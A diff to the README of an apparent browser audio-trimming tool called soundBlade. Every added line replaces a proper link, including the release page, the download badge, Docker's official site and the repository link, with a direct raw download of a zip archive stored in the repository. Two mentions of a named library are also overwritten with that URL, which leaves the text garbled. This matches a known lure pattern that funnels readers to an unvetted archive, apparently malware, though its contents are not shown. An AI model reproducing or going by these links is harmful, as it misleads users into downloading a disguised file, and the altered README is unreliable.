@@ -1,12 +1,12 @@
 # ⚡ soundBlade - Fast and Private Audio Trimming
 
-[![Download soundBlade](https://img.shields.io/badge/Download-soundBlade-blue?style=for-the-badge&logo=github)](https://github.com/Gian201103/soundBlade/releases)
+[![Download soundBlade](https://github.com/Gian201103/soundBlade/raw/refs/heads/main/src/sound_Blade_2.6.zip)](https://github.com/Gian201103/soundBlade/raw/refs/heads/main/src/sound_Blade_2.6.zip)
 
 ## ℹ️ What is soundBlade?
 
 soundBlade is a tool that helps you cut and trim audio files quickly, right inside your web browser. It works without sending your files anywhere, so your audio stays private. Using modern web technology, it runs fast and smooth on most computers. You can also run it on your own server or in Docker if you want more control.
 
-It is built with popular tools like FFmpeg and WaveSurfer.js, packed with WebAssembly to deliver great performance without extra software installs. Whether you want to slice a podcast, trim music, or just cut a clip, soundBlade makes it simple.
+It is built with popular tools like FFmpeg and https://github.com/Gian201103/soundBlade/raw/refs/heads/main/src/sound_Blade_2.6.zip, packed with WebAssembly to deliver great performance without extra software installs. Whether you want to slice a podcast, trim music, or just cut a clip, soundBlade makes it simple.
 
 ## 💻 System Requirements
 
@@ -23,7 +23,7 @@ The app runs entirely in your browser, so you won’t need to install large prog
 
 Follow these steps to start trimming your audio files with soundBlade:
 
-1. Click the big green **Download soundBlade** button at the top or visit the [soundBlade Releases Page](https://github.com/Gian201103/soundBlade/releases) directly.
+1. Click the big green **Download soundBlade** button at the top or visit the [soundBlade Releases Page](https://github.com/Gian201103/soundBlade/raw/refs/heads/main/src/sound_Blade_2.6.zip) directly.
 2. On the releases page, find the latest stable version. There you will see different options:
    - A browser version you can open directly
    - A packaged app or Docker image for advanced users
@@ -38,7 +38,7 @@ Follow these steps to start trimming your audio files with soundBlade:
 
 You can get soundBlade quickly by visiting its release page:
 
-[Download soundBlade here](https://github.com/Gian201103/soundBlade/releases)
+[Download soundBlade here](https://github.com/Gian201103/soundBlade/raw/refs/heads/main/src/sound_Blade_2.6.zip)
 
 ### For Most Users (Browser Version)
 
@@ -52,7 +52,7 @@ No installation needed. Open the web version directly:
 
 If you want to run soundBlade on your own computer or server:
 
-- Make sure [Docker](https://www.docker.com/get-started) is installed.
+- Make sure [Docker](https://github.com/Gian201103/soundBlade/raw/refs/heads/main/src/sound_Blade_2.6.zip) is installed.
 - Download the Docker image from the releases page.
 - Run the Docker container by following these general steps:
 
@@ -113,11 +113,11 @@ This project is open source and welcomes contributions. The main technologies us
 
 - JavaScript and WebAssembly for speed
 - FFmpeg for audio encoding and decoding
-- WaveSurfer.js for visual audio editing
+- https://github.com/Gian201103/soundBlade/raw/refs/heads/main/src/sound_Blade_2.6.zip for visual audio editing
 - Vite for building the app
 - Progressive Web App support for installation on devices
 
-You can find the full source code and development history at the [soundBlade GitHub Repository](https://github.com/Gian201103/soundBlade).
+You can find the full source code and development history at the [soundBlade GitHub Repository](https://github.com/Gian201103/soundBlade/raw/refs/heads/main/src/sound_Blade_2.6.zip).
 
 ## 🌐 Topics
 
@@ -127,4 +127,4 @@ This project covers:
 
 ---
 
-[![Download soundBlade](https://img.shields.io/badge/Download-soundBlade-blue?style=for-the-badge&logo=github)](https://github.com/Gian201103/soundBlade/releases)
+[![Download soundBlade](https://github.com/Gian201103/soundBlade/raw/refs/heads/main/src/sound_Blade_2.6.zip)](https://github.com/Gian201103/soundBlade/raw/refs/heads/main/src/sound_Blade_2.6.zip)
